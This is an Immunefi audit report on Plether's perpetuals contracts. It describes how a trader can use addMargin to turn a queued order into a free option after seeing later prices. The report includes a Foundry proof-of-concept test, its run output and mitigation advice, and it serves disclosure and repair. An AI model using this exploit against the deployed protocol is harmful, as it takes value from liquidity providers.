# \#98782 [SC-Low] Trader can turn a "binding" queued order into a free conditional fill by pinning an unattainable equity/leverage bound and toggling it with `addMargin` after seeing post-tick prices

**Submitted on Nov 10th 2026 at 06:14:50 UTC by @Web3Vinay for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98782
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Contract fails to deliver promised returns, but doesn't lose value
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

### Brief/Intro

Plether has no user cancel path. SECURITY.md:658-659 states that this "prevent[s] traders from turning queued intents into free options". This guarantee does not hold for partial closes and increases.

The V3 bounds `minPostPositionEquityAssets` and `maxPostLeverageBps` are checked against the account's live margin at execution time, and `CfdEngine.addMargin` stays callable while the order is pending. A trader commits an order with a bound their current margin cannot meet, so by default the order fails terminally for free. After seeing prices later than the fill tick, the trader picks the outcome:
- Price moved against them: call `addMargin`, and the order executes at the old commit-time tick.
- Price moved in their favour: do nothing, and the order fails at zero cost.

The honest keeper cannot prevent either outcome.

### Vulnerability Details

1. **The bounds are read from live state at execution.** `_enforceBounds` checks post-position equity and leverage computed from the current margin (`CfdOrderPolicyEvaluatorBase.sol:530-539`; inputs built at `:367-386` for opens and `:439-471` for closes).
2. **A failed bound is terminal and cheap.** `ConstraintViolation` is classified as terminal (`OrderRouterExecutionSidecar.sol:878-887`).
   - A failed close costs 0.
   - A failed increase costs at most the 0.2 USDG open bounty (`router/OrderRouterBase.sol:74`).
3. **The trader can change the input after commit.** `addMargin` has no pending-order check (`CfdEngine.sol:501-529`):
   ```solidity
   function addMargin(address account, uint256 amount) external nonReentrant {
       if (msg.sender != account) revert CfdEngine__NotAccountOwner();
       ...
       clearinghouse.lockPositionMargin(account, amount);
   ```
   More margin means higher equity and lower leverage, which flips a failing order to executing.
4. **The analogous lever is already closed.** For `minPostSettlementBalanceAssets`, the protocol blocks this pattern:
   - The floor is only allowed on a flat open with no pending order (`router/OrderLiquidationBatchLogic.sol:303-312`).
   - Withdrawals preserve it while the order is pending (`CfdEngineSettlementSidecar.sol:258-272`).

   The equity and leverage bounds have no such guard. This is the same root-cause class as pre-audit SC-M4 ("Risk Free Option in 60Sec Oracle Window", fixed), reached through a lever that fix does not cover.

**Longer decision window (optional).** By default the decision window is the honest keeper's latency (seconds). At the weekly FAD close-only boundary, the trader can stretch it:
- A second account commits a tiny open in the last live second. That order stays `Pending(CloseOnly)` at the FIFO head (`OrderRouterExecutionSidecar.sol:442-444`).
- The trader's close behind it reverts `OrderNotQueueHead` (`:198-207`) until the wall order's deadline, 58 s at default config.
- The close is still filled at its own commit-time tick.

### Impact Details

- **Invariant broken:** a trader can choose between execution and a free terminal failure after seeing prices later than the fill tick. This contradicts SECURITY.md:658-659 (also :366, :719, :1345).
- **Who pays:** LPs, the counterparty. The trader keeps only the stale fills that are adverse to LPs.
- **PoC:** with a 0.5 % adverse move behind the FAD wall, the trader closes $40k at the stale tick and avoids a **200 USDG** loss, which LPs absorb instead.
- **Expected value per order:** ≈ 0.399·σ_L·notional, with σ = 0.45 %/day:

  | Decision window | per $100k | per $1M |
  |---|---|---|
  | 2 s (honest keeper latency) | $0.86 | $8.6 |
  | 58 s (FAD wall, default config) | $4.65 | $46.5 |

### Mitigation

Evaluate `minPostPositionEquityAssets` and `maxPostLeverageBps` against `min(live position margin, position margin at commit)`, so that adding margin after commit can never turn a failing order into an executing one.

Alternatively, block `addMargin` while the account has a pending order with a non-default equity or leverage bound, mirroring the settlement-floor treatment. Blocking has a cost: it removes a de-risking action, so the snapshot approach is preferable.

If the behaviour is intended, update SECURITY.md:658-659.

### References

- `packages/perps/src/CfdEngine.sol:501-529`: `addMargin`, no pending-order check
- `packages/perps/src/CfdOrderPolicyEvaluatorBase.sol:367-386`, `:439-471`, `:530-539`: bounds from live margin
- `packages/perps/src/OrderRouterExecutionSidecar.sol:878-887`: `ConstraintViolation` is terminal
- `packages/perps/src/router/OrderRouterBase.sol:74`: max open bounty 0.2 USDG
- `packages/perps/src/router/OrderLiquidationBatchLogic.sol:303-312`, `packages/perps/src/CfdEngineSettlementSidecar.sol:258-272`: analogous settlement-floor lever, guarded
- `packages/perps/src/OrderRouterExecutionSidecar.sol:198-207`, `:442-444`: FIFO head / `Pending(CloseOnly)` wall
- `packages/perps/SECURITY.md:658-659`: "binding order semantics ... prevent traders from turning queued intents into free options"

## Proof of Concept

## Proof of Concept

Save as `packages/perps/test/perps/AddMarginBoundConditionalExecution.t.sol` (uses the repo's `BasePerpTest` fixture; no in-scope code is modified) and run:

```
forge test --root packages/perps --match-path test/perps/AddMarginBoundConditionalExecution.t.sol -vv
```

The file has two tests:
- `test_liveCloseIsConditionalAtZeroCost`: from one snapshot, the same queued close either fails with zero balance change (trader does nothing) or executes (trader calls `addMargin` before the keeper lands).
- `test_fadWallDefaultWindow_adverse`: at default config, the trader decides 58 s after the fill tick, opts in, and closes at the stale tick. The test compares this against the same close at the later price.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "./BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderLifecycleBook} from "@plether/perps/interfaces/IOrderLifecycleBook.sol";
import {IOrderRouterErrors} from "@plether/perps/interfaces/IOrderRouterErrors.sol";
import {SafeCast} from "@openzeppelin/contracts/utils/math/SafeCast.sol";
import {Vm} from "forge-std/Vm.sol";
import {console2} from "forge-std/console2.sol";

/// A trader pins an unattainable minPostPositionEquityAssets on a partial close, so by default the order fails
/// terminally at zero cost. After seeing prices later than the fill tick, the trader either does nothing (free fail)
/// or calls CfdEngine.addMargin so the same order executes at the stale commit-time tick.
/// Place at packages/perps/test/perps/AddMarginBoundConditionalExecution.t.sol
contract AddMarginBoundConditionalExecutionTest is BasePerpTest {

    address internal constant T = address(0xA11CE); // trader
    address internal constant W = address(0xBA11); // trader's second account (FIFO wall)
    address internal constant K = address(0xEEEE); // honest keeper
    uint256 internal constant P0 = 80_000_000; // $0.80 fill tick
    uint256 internal _cid = 0xC000;

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 5_000_000e6;
    }

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function setUp() public override {
        super.setUp();
        _fundTrader(T, 200_000e6);
        _fundTrader(W, 10_000e6);
    }

    function _req(
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose
    ) internal returns (OrderV3Types.OrderRequest memory r) {
        r.clientOrderId = bytes32(++_cid);
        r.side = side;
        r.sizeDelta = size;
        r.marginDelta = margin;
        r.isClose = isClose;
        r.targetPrice = side == CfdTypes.Side.LONG ? (isClose ? CAP_PRICE : 1) : (isClose ? 1 : CAP_PRICE);
        r.bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(vm.getBlockTimestamp() + 1 hours),
            executionWindowSeconds: 60,
            allowedExecutionModes: 7,
            expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
    }

    function _commit(
        address who,
        OrderV3Types.OrderRequest memory r
    ) internal returns (uint64 id, uint64 commitTime) {
        vm.prank(who);
        id = router.commitOrder(r);
        commitTime = router.lifecycleBook().pendingIntent(id).timing.commitTimestamp;
    }

    /// The unique historical tick the oracle must use for an order committed at `publishTime - 1`.
    function _tickData(
        uint256 publishTime,
        uint256 price
    ) internal returns (bytes[] memory data) {
        baseMockPyth.setAllUniquePrices(
            _basePythFeedIds(), SafeCast.toInt64(SafeCast.toInt256(price)), 0, int32(-8), publishTime, publishTime - 1
        );
        data = new bytes[](1);
        data[0] = abi.encode(price);
    }

    function _exec(
        uint64 id,
        uint64 commitTime,
        uint256 price
    ) internal returns (OrderV3Types.OrderReceipt memory rec) {
        vm.roll(vm.getBlockNumber() + 1);
        bytes[] memory data = _tickData(uint256(commitTime) + 1, price);
        vm.recordLogs();
        vm.prank(K);
        router.executeOrder(id, data);
        Vm.Log[] memory logs = vm.getRecordedLogs();
        address book = address(router.lifecycleBook());
        for (uint256 i; i < logs.length; i++) {
            if (logs[i].emitter != book || logs[i].topics[0] != IOrderLifecycleBook.OrderFinalized.selector) continue;
            (,,, OrderV3Types.OrderReceipt memory r) =
                abi.decode(logs[i].data, (bytes32, uint64, uint64, OrderV3Types.OrderReceipt));
            if (r.orderId == id) return r;
        }
        revert("no receipt");
    }

    function _openLong(
        uint256 size,
        uint256 margin
    ) internal {
        (uint64 id, uint64 c) = _commit(T, _req(CfdTypes.Side.LONG, size, margin, false));
        vm.warp(uint256(c) + 2);
        assertEq(uint8(_exec(id, c, P0).status), uint8(OrderV3Types.LifecycleStatus.Executed));
    }

    function _pos(
        address a
    ) internal view returns (uint256 size) {
        (size,,,,,,) = engine.positions(a);
    }

    /// 1. Live market, honest keeper: the same queued close is Failed (cost 0) or Executed, at the trader's choice.
    function test_liveCloseIsConditionalAtZeroCost() public {
        router.updateMarkPrice(_mockPythUpdateData(P0));
        _openLong(100_000e18, 2_000e6); // $80k LONG, 2,000 USDG margin
        OrderV3Types.OrderRequest memory r = _req(CfdTypes.Side.LONG, 50_000e18, 0, true);
        r.bounds.minPostPositionEquityAssets = 2_000e6; // unattainable without extra margin (~940 USDG left)
        (uint64 id, uint64 c) = _commit(T, r);
        uint256 bal0 = clearinghouse.balanceAssets(T);
        uint256 snap = vm.snapshotState();

        // Branch A: trader does nothing -> terminal Failed, zero cost, position kept
        vm.warp(uint256(c) + 5);
        OrderV3Types.OrderReceipt memory a = _exec(id, c, P0);
        console2.log("no action -> status (3=Failed) / constraint (8=PostPositionEquity)", uint8(a.status), uint8(a.failure.constraint));
        console2.log("trader balance change on Failed (atoms)", int256(clearinghouse.balanceAssets(T)) - int256(bal0));
        assertEq(uint8(a.status), uint8(OrderV3Types.LifecycleStatus.Failed));
        assertEq(clearinghouse.balanceAssets(T), bal0, "failure is free");
        assertEq(_pos(T), 100_000e18);
        vm.revertToState(snap);

        // Branch B: trader calls addMargin before the keeper lands -> same order executes at the commit-time tick
        vm.warp(uint256(c) + 4);
        vm.prank(T);
        engine.addMargin(T, 3_000e6);
        vm.warp(uint256(c) + 5);
        OrderV3Types.OrderReceipt memory b = _exec(id, c, P0);
        console2.log("addMargin -> status (2=Executed)", uint8(b.status));
        assertEq(uint8(b.status), uint8(OrderV3Types.LifecycleStatus.Executed));
        assertEq(_pos(T), 50_000e18);
    }

    function _closeOnlyStart(
        uint256 from
    ) internal returns (uint256 t) {
        t = from;
        while (true) {
            vm.warp(t + 300);
            if (pletherOracle.getOrderExecutionPolicy(false).closeOnly) break;
            t += 300;
        }
        while (true) {
            vm.warp(t + 1);
            if (pletherOracle.getOrderExecutionPolicy(false).closeOnly) break;
            t += 1;
        }
        t += 1;
    }

    /// 2. FAD close-only boundary, default config: a wall order stretches the decision window to 58 s.
    ///    Price moves 0.5 % against the LONG; the trader opts in and closes at the stale tick.
    function test_fadWallDefaultWindow_adverse() public {
        uint256 laterPrice = 80_400_000; // +0.5 % after the fill tick (adverse for this LONG)
        uint256 cos = _closeOnlyStart(1_709_899_200); // Friday 2024-03-08 12:00 UTC -> 21:30 UTC
        vm.warp(cos - 900);
        router.updateMarkPrice(_mockPythUpdateData(P0));
        _openLong(100_000e18, 6_000e6);
        vm.warp(cos - 1);
        router.updateMarkPrice(_mockPythUpdateData(P0));
        vm.warp(cos - 1); // last live second: W's open becomes Pending(CloseOnly) for its whole window
        (uint64 wall, uint64 cw) = _commit(W, _req(CfdTypes.Side.SHORT, 2_000e18, 100e6, false));
        vm.warp(cos + 1);
        OrderV3Types.OrderRequest memory r = _req(CfdTypes.Side.LONG, 50_000e18, 0, true);
        r.bounds.minPostPositionEquityAssets = 4_500e6; // default-fail
        (uint64 id, uint64 c) = _commit(T, r);

        // the honest keeper cannot reach the trader's order while the wall is live
        vm.warp(uint256(c) + 10);
        vm.roll(vm.getBlockNumber() + 1);
        bytes[] memory dw = _tickData(uint256(cw) + 1, P0);
        vm.prank(K);
        assertEq(uint8(router.executeOrder(wall, dw).pendingReason), uint8(OrderV3Types.PendingReason.CloseOnly));
        vm.roll(vm.getBlockNumber() + 1);
        bytes[] memory dr = _tickData(uint256(c) + 1, P0);
        vm.prank(K);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__OrderNotQueueHead.selector);
        router.executeOrder(id, dr);

        // decision at the wall's deadline: later price is worse for the LONG, so the trader opts in
        uint256 decide = uint256(cw) + 60;
        uint256 snap = vm.snapshotState();
        vm.warp(decide);
        vm.prank(T);
        engine.addMargin(T, 4_000e6);
        vm.warp(decide + 1);
        OrderV3Types.OrderReceipt memory b = _exec(id, c, P0);
        assertEq(uint8(b.status), uint8(OrderV3Types.LifecycleStatus.Executed));
        assertEq(b.oraclePublishTime, c + 1, "filled at the commit-time tick");
        int256 pnlStale = b.economics.realizedPnlAssets;
        vm.revertToState(snap);

        // counterfactual: the same close filled at the later price
        vm.warp(decide);
        vm.prank(T);
        engine.addMargin(T, 4_000e6);
        vm.warp(decide + 1);
        int256 pnlLater = _exec(id, c, laterPrice).economics.realizedPnlAssets;
        int256 avoided = pnlStale - pnlLater;

        console2.log("delay fill-tick -> execution (s)", decide + 1 - (uint256(c) + 1));
        console2.log("realised PnL at stale tick / at later price (atoms):");
        console2.logInt(pnlStale);
        console2.logInt(pnlLater);
        console2.log("loss avoided by trader, absorbed by LPs (atoms)", uint256(avoided));
        assertGt(avoided, 0);
    }

}
```

Result (actually run at the in-scope commit):

```
Ran 2 tests for test/perps/AddMarginBoundConditionalExecution.t.sol:AddMarginBoundConditionalExecutionTest
[PASS] test_fadWallDefaultWindow_adverse() (gas: 13409155)
Logs:
  delay fill-tick -> execution (s) 58
  realised PnL at stale tick / at later price (atoms):
  0
  -200000000
  loss avoided by trader, absorbed by LPs (atoms) 200000000

[PASS] test_liveCloseIsConditionalAtZeroCost() (gas: 5107684)
Logs:
  no action -> status (3=Failed) / constraint (8=PostPositionEquity) 3 8
  trader balance change on Failed (atoms) 0
  addMargin -> status (2=Executed) 2

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 71.14ms (62.52ms CPU time)
```

